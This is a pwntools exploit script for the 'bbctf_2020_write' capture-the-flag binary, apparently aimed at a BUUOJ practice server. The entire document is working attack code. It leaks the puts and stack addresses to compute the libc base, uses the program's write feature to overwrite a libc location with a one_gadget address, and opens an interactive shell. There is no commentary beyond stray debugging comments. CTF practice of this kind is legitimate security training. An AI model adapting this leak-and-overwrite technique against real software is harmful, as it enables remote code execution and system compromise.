import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='bbctf_2020_write'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
# pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',27257)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		
		io.recvuntil('puts: ')
		libc_base=int(io.recvline(),16)-libc.sym['puts']
		io.recvuntil('stack: ')
		stack_addr=int(io.recvline(),16)



		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['_IO_2_1_stdout_']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		io.recv()
		io.sendline('w')
		io.recv()
		io.sendline(str(libc_base+0x619F68))
		io.recv()
		io.sendline(str(libc_base+one_gadgaet[1]))
		io.recv()
		io.sendline('q')


		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue